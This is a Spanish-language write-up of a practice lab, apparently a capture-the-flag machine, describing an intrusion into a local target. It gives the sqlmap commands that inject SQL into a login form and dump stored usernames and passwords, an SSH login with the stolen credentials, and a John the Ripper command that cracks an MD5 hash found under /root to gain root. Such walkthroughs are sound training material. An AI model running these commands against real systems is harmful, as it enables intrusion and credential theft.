# Backend

Laboratorio para practicar inyección SQL con sqlmap para volcar credenciales y acceder por SSH.

## ESCANEO DE PUERTOS

![](screenshots/01.png)

Observamos la web y vemos que muestra por el navegador.

![](screenshots/02.png)

## BÚSQUEDA DE DIRECTORIOS

![](screenshots/03.png)

Encontramos directorios los cuales investigaremos

![](screenshots/04.png)

Pero desde el apartado login haremos la intrusión

![](screenshots/05.png)

Probamos credenciales para ver su resulado

![](screenshots/06.png)

## INTRUSIÓN MEDIANTES SQLMAP

`sqlmap -u http://172.17.0.2/login.html --forms --dbs --batch`

![](screenshots/07.png)

`sqlmap -u http://172.17.0.2/login.html --forms -D users --tables --batch`

![](screenshots/08.png)

`sqlmap -u http://172.17.0.2/login.html --forms -D users -T usuarios --columns --batch`

![](screenshots/09.png)

`sqlmap -u http://172.17.0.2/login.html --forms -D users -T usuarios -C username,password --dump --batch`

![](screenshots/10.png)

Accedemos por SSH con el usuario pepe

![](screenshots/11.png)

## ESCALADA DE PRIVILEGIOS

Buscamos los binarios y cuales podemos ejecutar

![](screenshots/12.png)

Destacamos:

`grep`

ls (para listar directorios como /root)

![](screenshots/13.png)

Encontramos el siguiente archivo que mostraremos con grep

![](screenshots/14.png)

Guardaremos ese fragmento en un archivo hash y lo descifraremos con jhon the ripper

`john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash`

![](screenshots/15.png)

Accedemos a root usando esta credencial

![](screenshots/16.png)